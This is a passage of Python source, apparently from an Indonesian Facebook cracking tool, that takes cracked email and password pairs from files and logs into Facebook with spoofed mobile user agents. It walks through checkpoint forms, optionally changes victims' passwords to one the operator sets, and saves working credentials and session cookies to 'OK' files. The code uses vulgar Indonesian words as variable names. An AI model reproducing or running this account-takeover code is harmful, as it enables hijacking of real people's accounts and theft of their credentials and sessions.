	rr = random.randrange
	haram = f"Mozilla/5.0 (iPhone; CPU iPhone OS 17_1_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) OPiOS/16.0.15.124050 Mobile/15E148 Safari/9537.53"
	return haram

def Free():
	rc = random.choice
	rr = random.randrange
	memek = f"Mozilla/5.0 (iPhone; CPU iPhone OS 15_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) OPiOS/16.0.15.124050 Mobile/15E148 Safari/9537.53"
	return memek

def Prod():
	rc = random.choice
	rr = random.randrange
	bokep = f"Mozilla/5.0 (Linux; Android {str(rr(9,14))}; PPA-LX1; HMSCore 6.11.0.301) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(80,130))}.0.{str(rr(4000,6170))}.{str(rr(150,170))} HuaweiBrowser/14.0.0.322 Mobile Safari/537.36"
	return bokep
	
def Bocil3():
	rc = random.choice
	rr = random.randrange
	bocil = f"Mozilla/5.0 (Linux; Android {str(rr(9,14))}; SM-A346M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(80,130))}.0.{str(rr(4000,6170))}.{str(rr(150,170))} Mobile Safari/537.36 OPR/80.4.4244.77866"
	return bocil
#----------[ CEK-OPSI ]----------#	
def ceker(idf,pw):
	global cp
	rc = random.choice
	head = {"Host": url,
	"cache-control": "max-age=0",
	"upgrade-insecure-requests": "1",
	"origin": "https://"+url,
	"content-type": "application/x-www-form-urlencoded",
	"user-agent": "Mozilla/5.0 (Linux; Android 10; DOOGEE B10 Build/KOTG49H) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Mobile Safari/537.36",
	"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
	"x-requested-with": "com.android.chrome",
	"sec-fetch-site": "same-origin",
	"sec-fetch-mode": "navigate",
	"sec-fetch-user": "?1",
	"sec-fetch-dest": "document",
	"referer": f"https://{url}/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F",
	"accept-encoding": "gzip, deflate",
	"accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"}
	ses = requests.Session()
	try:
		hi = ses.get('https://'+url)
		kontol = sop(ses.post(
		'https://'+url+'/login.php',
		data={
		'email':idf,
	'pass':pw,
'login':'submit'
		},headers=head, allow_redirects=True).text,'html.parser')
		jo = kontol.find(
		'form'
		)
		data = {}
		lion = [
		'nh',
	'jazoest',
'fb_dtsg',
	'submit[Continue]',
		'checkpoint_data'
		]
		for anj in jo('input'):
			if anj.get('name') in lion:
				data.update({anj.get('name'):anj.get('value')})
		kent = sop(ses.post('https://'+url+str(jo['action']), data=data, headers=head).text,'html.parser')
		opsi = kent.find_all('option')
		if len(opsi)==0:
			tree = Tree("")
			tree.add(f"{H}Tapyes / A2f ( cek di mbasic ){P}")
			prints(tree)
			#open('CYXIEON-CP/'+'CYXIEON-CP.txt','a').write(idf+'|'+pw+'|'+'\n')
			#cp+=1
		else:
			for opsii in opsi:
				print('\r%s---> %s%s'%(kk,opsii.text,x))
	except Exception as c:
		tree = Tree("")
		tree.add(f"{H}{idf}{P}").add(f"{H}{pw}{P}")
		tree.add(f"{M}spam ip tidak dapat cek ops{P}i")
		prints(tree)
###===============> [Opsi-Akun] <================###
import requests, shutil, os, re, bs4, sys, json, time, platform ,random, datetime, subprocess, logging, base64
import hmac, hashlib, urllib, stdiomask, urllib.request, uuid
from concurrent.futures import ThreadPoolExecutor
from bs4 import BeautifulSoup as parser
from threading import (Thread, Event)
from time import sleep as jeda
from datetime import datetime

ct = datetime.now()
n = ct.month
bulan_ = ['January', 'Februari', 'Maret', 'April', 'Mei', 'Juni', 'Juli', 'Agustus', 'September', 'Oktober', 'November', 'Desember']
try:
	if n < 0 or n > 12:
		exit()
	nTemp = n - 1
except ValueError:
	exit()

current = datetime.now()
hari = current.day
bulan = bulan_[nTemp]
tahun = current.year
bullan = current.month

waktu = ("%s-%s-%s"%(hari,bulan,tahun))
bulan12 = {"01": "January", "02": "Februari", "03": "Maret", "04": "April", "05": "Mei", "06": "Juni", "07": "Juli", "08": "Agustus", "09": "September", "10": "Oktober", "11": "November", "12": "Desember"}

M = '\x1b[1;91m' # MERAH
H = '\x1b[1;92m' # HIJAU
K = '\x1b[1;93m' # KUNING
B = '\x1b[1;94m' # BIRU
U = '\x1b[1;95m' # UNGU
O = '\x1b[1;96m' # BIRU MUDA
P = '\x1b[1;97m' # PUTIH
J = '\033[38;2;255;127;0;1m' # ORANGE
N = '\x1b[0m' # WARNA MATI
acak = [M, H, K, B, U, O, P, J]
warna = random.choice(acak)
til ="\033[0m "

def jalan(keliling):
	for mau in keliling + '\n':
		sys.stdout.write(mau)
		sys.stdout.flush();jeda(0.03)
		
		
ubah_pass = []
pwbaru = []
pwBaru = []
ubahP = []

def file_cp():
	dirs = os.listdir('CP')
	prints(Panel(f"""{P2}copy nama file hasil crack di bawah ini kemudian pastekan di bawah untuk cek opsi""",width=87,style=f"{color_panel}"))
	for file in dirs:
		prints(Panel(f"""{K2}{(file)}""",width=87,style=f"{color_panel}"))
	try:
		prints(Panel(f"""{P2}copy nama file di atas kemudian tempel di bawah ini contoh {M2}: {H2}{waktu}.txt""",width=87,style=f"{color_panel}"))
		opsi()
	except IOError:
		prints(Panel(f"""{M2}Tidak ada file untuk di cek silahkan crack dulu""",width=87,style=f"{color_panel}"))
		Menu().menu()

def opsi():
	CP = ("CP/")
	romi = console.input(f" {H2}⬤ {P2}Tempel atau masukan nama file yang ingin di cek disini : ")
	if romi == "":
		prints(Panel(f"""{K2}isi yang benar""",width=87,style=f"{color_panel}"))
		opsi()
	try:
		file_cp = open(CP+romi, "r").readlines()
	except IOError:
		exit(prints(Panel(f"""{P2}nama file{K2} {(romi)} {P2}tidak di temukan""",width=87,style=f"{color_panel}")))
	prints(Panel(f"""{P2}sebelem melanjutkan hidupkan mode pesawat selama 10 detik""",width=87,style=f"{color_panel}"))
	pw=console.input(f" {H2}⬤ {P2}ubah password ketika tab yes y/n : ")
	if pw in['y','Y']:
		ubah_pass.append("ubah_sandi")
		pw2=console.input(f" {H2}⬤ {P2}Masukan Password baru :{H2} ")
		if len(pw2) <= 5:
			prints(Panel(f"""{K2}Sandi minimal 6 karakter""",width=87,style=f"{color_panel}"))
		else:
			pwbaru.append(pw2)
	prints(Panel(f"""{P2}Total akun {M2}:{H2} {str(len(file_cp))}""",width=87,style=f"{color_panel}"))
	nomor = 0
	for fb in file_cp:
		akun = fb.replace("\n","")
		ngecek  = akun.split("|")
		nomor+=1
		#print("\n%s%s.%s \033[0mlogin akun %s> %s%s"%(H,str(nomor),O,M,K,akun.replace(" *--> ","")));jeda(0.07)
		prints(Panel(f"""{P2}[{H2}{(str(nomor))}{P2}] {P2}Cek sesi akun {K2}>=> {K2}{akun}""",width=87,style=f"{color_panel}"));jeda(0.10)
		try:
			mengecek(ngecek[0].replace("",""), ngecek[1])
		except requests.exceptions.ConnectionError:
			continue
	print("\n")
	Console(width=30).print(Panel(f"[bold green]SELESAI MENGECEK OPSI", style='red'),justify='left')
	console.input(f" {H2}⬤ {P2}Tekan Enter")
	#console.input("%s%s%s [%s Tekan Enter Untuk Kembali%s ] "%(U,til,O,U,O))
	Menu().menu()
	
data = {}
data2 = {}

def mengecek(user,pw):
	global loop,ubah_pass,pwbaru
	session=requests.Session()
	ua = 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Mobile Safari/537.36'
	#ua = 'Mozilla/5.0 (Linux; Android 8.1.0; S45B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Mobile Safari/537.36'
	url = "https://id-id.facebook.com"
	session.headers.update({"Host": "id-id.facebook.com","cache-control": "max-age=0","upgrade-insecure-requests": "1","origin": "https://id-id.facebook.com","content-type": "application/x-www-form-urlencoded","user-agent": ua,"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with": "mark.via.gp","sec-fetch-site": "same-origin","sec-fetch-mode": "navigate","sec-fetch-user": "?1","sec-fetch-dest": "document","referer": "https://id-id.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8","accept-encoding": "gzip, deflate","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"})
	soup=bs4.BeautifulSoup(session.get(url+"/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8").text,"html.parser")
	link=soup.find("form",{"method":"post"})
	for x in soup("input"):
		data.update({x.get("name"):x.get("value")})
	data.update({"email":user,"pass":pw})
	urlPost=session.post(url+link.get("action"),data=data)
	response=bs4.BeautifulSoup(urlPost.text, "html.parser")
	if "c_user" in session.cookies.get_dict():
		if "Akun Anda Dikunci" in urlPost.text:
			print("\r%s%s\033[0m akun terkunci sesi new"%(M,til))
		else:
			print("\r%s%s\033[0m akun tidak checkpoint, silahkan anda login "%(til,H))
			open('OK/OK-%s.txt'%(waktu), 'a').write(" %s|%s\n" % (user,pw))
	elif "checkpoint" in session.cookies.get_dict():
		coki = (";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
		title=re.findall("\<title>(.*?)<\/title>",str(response))
		link2=response.find("form",{"method":"post"})
		listInput=['fb_dtsg','jazoest','checkpoint_data','submit[Continue]','nh']
		for x in response("input"):
			if x.get("name") in listInput:
				data2.update({x.get("name"):x.get("value")})
		an=session.post(url+link2.get("action"),data=data2)
		response2=bs4.BeautifulSoup(an.text,"html.parser")
		cek=[cek.text for cek in response2.find_all("option")]
		number=0
		print("\r%s%s \033[0m terdapat %s%s%s \033[0mopsi %s:"%(U,O,P,str(len(cek)),O,M));jeda(0.07)
		if(len(cek)==0):
			if "Lihat detail login yang ditampilkan. Ini Anda?" in title:
				if "ubah_sandi" in ubah_pass:
					dat,dat2={},{}
					but=["submit[Yes]","nh","fb_dtsg","jazoest","checkpoint_data"]
					for x in response("input"):
						if x.get("name") in but:
							dat.update({x.get("name"):x.get("value")})
					ubahPw=session.post(url+link2.get("action"),data=dat).text
					resUbah=bs4.BeautifulSoup(ubahPw,"html.parser")
					link3=resUbah.find("form",{"method":"post"})
					but2=["submit[Next]","nh","fb_dtsg","jazoest"]
					if "Buat Kata Sandi Baru" in re.findall("\<title>(.*?)<\/title>",str(ubahPw)):
						for b in resUbah("input"):
							dat2.update({b.get("name"):b.get("value")})
						dat2.update({"password_new":"".join(pwbaru)})
						an=session.post(url+link3.get("action"),data=dat2)
						coki = (";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
						print("\r%s%s\033[0makun one tab, sandi berhasil di ubah \n OK %s%s%s|%s|%s			"%(H,til,N,H,user,pwbaru[0],coki))
						open('OK/OK-%s.txt' %(waktu), 'a').write("%s%s|%s|%s\n" % (H,user,pwbaru[0],coki))
						#cek_apk(coki)
				else:
					print("\r%s%s \033[0m\x1b[1;92mCheckpoint Terbuka, Akun Tap Yes Silahkan Login		"%(H,til))
					tree = Tree(" ",guide_style=f"{color_ok}")
					tree.add(Panel(f"{H2}{ua}{P2}",width=83,padding=(0,2),style=f"{color_ok}"))
					prints(tree)
					open('OK/OK-%s.txt' %(waktu), 'a').write("%s %s|%s|%s\n" % (H,user,pw,coki))
					#cek_apk(coki)
			elif "Masukkan Kode Masuk untuk Melanjutkan" in re.findall("\<title>(.*?)<\/title>",str(response)):
				print("\r%s\033[0m akun terpasang autentikasi dua faktor			"%(M))
			else:
				print("%s%s\033[0mterjadi kesalahan"%(M,til))
		else:
			if "c_user" in session.cookies.get_dict():
				print("\r%s%s akun tidak checkpoint, silahkan anda login "%(H))
				open('OK/OK-%s.txt' %(waktu), 'a').write("%s%s|%s\n" % (H,user,pw))
		for opsi in range(len(cek)):
			number +=1
			jalan ("  %s%s. %s%s"%(P,str(number),K,cek[opsi]))
	elif "login_error" in str(response):
		oh = run.find("div",{"id":"login_error"}).find("div").text
		print("%s %s"%(M,oh))
	else:
		tree = Tree(" ",guide_style=f"{color_panel}")
		tree.add(Panel(f"{O2}login gagal, silahkan cek kembali id dan kata sandi{P2}",width=83,padding=(0,2),style=f"{color_panel}"))
		prints(tree)
#-----------------------[ SYSTEM-CONTROL ]--------------------#
if __name__=='__main__':
	try:os.system('git pull')
	except:pass
	try:os.mkdir('OK')
	except:pass
	try:os.mkdir('CP')
	except:pass
	try:os.mkdir('DUMP')
	except:pass
	try:os.system('touch .prox.txt')
	except:pass
	login()

#>>>>> THANKS TO THIS HERE <<<<<<<#
#>>>>> Alvino_Adijaya_Xy <<<<<<